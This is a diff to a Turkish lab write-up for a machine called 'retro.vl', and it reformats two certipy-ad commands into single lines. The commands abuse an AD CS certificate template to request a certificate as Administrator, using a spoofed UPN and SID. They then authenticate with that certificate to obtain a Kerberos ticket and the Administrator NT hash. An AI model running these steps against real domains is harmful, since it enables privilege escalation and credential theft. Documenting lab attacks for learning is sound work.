@@ -293,12 +293,7 @@ Bunun istismar edilebilir olmasının ikinci şartı da **kimin bu şablona enro
 `BANKING$` hesabımla, ama sertifikanın kimlik bilgilerini **Administrator**'a ait olacak şekilde belirterek bir talep gönderdim:
 
 ```bash
-certipy-ad req -u 'BANKING$@retro.vl' -p '123456' \
-  -ca 'retro-DC-CA' -template 'RetroClients' \
-  -upn 'administrator@retro.vl' \
-  -sid 'S-1-5-21-2983547755-698260136-4283918172-500' \
-  -key-size 4096 -dc-ip 10.129.51.149 -dc-host 'DC.retro.vl' \
-  -dynamic-endpoint
+certipy-ad req -u 'BANKING$@retro.vl' -p '123456' -ca 'retro-DC-CA' -template 'RetroClients' -upn 'administrator@retro.vl' -sid 'S-1-5-21-2983547755-698260136-4283918172-500' -key-size 4096 -dc-ip 10.129.51.149 -dc-host 'DC.retro.vl' -dynamic-endpoint
 ```
 
 Burada `-upn` parametresinin yanında ayrıca **`-sid`** ile Administrator'ın gerçek SID'ini (`...-500`, well-known Administrator RID'i) de belirttim. Bunun sebebi, modern AD ortamlarında (özellikle Certipy'nin de dikkat çektiği, SID tabanlı güçlü eşleştirme zorunluluğu getiren güncellemelerden sonra) sertifika üzerindeki kimlik doğrulamasının yalnızca UPN alanına değil, sertifikanın **security extension/SAN** kısmına gömülen SID'e de bakarak yapılabilmesidir. UPN'i doğru versem bile SID eşleşmezse kimlik doğrulama reddedilebiliyordu; bu yüzden ikisini birlikte, tutarlı şekilde vermek gerekiyordu.
@@ -321,8 +316,7 @@ Elimde artık Administrator kimliğini temsil eden, hem UPN hem de SID alanları
 Bu sertifikayı kullanarak doğrudan Administrator olarak Kerberos kimlik doğrulaması yapabiliyordum:
 
 ```bash
-certipy-ad auth -pfx administrator_0a2b4f9d-311b-47b3-b168-9d8ebadd9551.pfx \
-  -dc-ip 10.129.51.149 -username administrator -domain retro.vl
+certipy-ad auth -pfx administrator_0a2b4f9d-311b-47b3-b168-9d8ebadd9551.pfx -dc-ip 10.129.51.149 -username administrator -domain retro.vl
 ```
 
 Certipy hem bir Kerberos TGT (ticket) aldı hem de bonus olarak Administrator'ın **NT hash'ini** çözüp bana verdi:
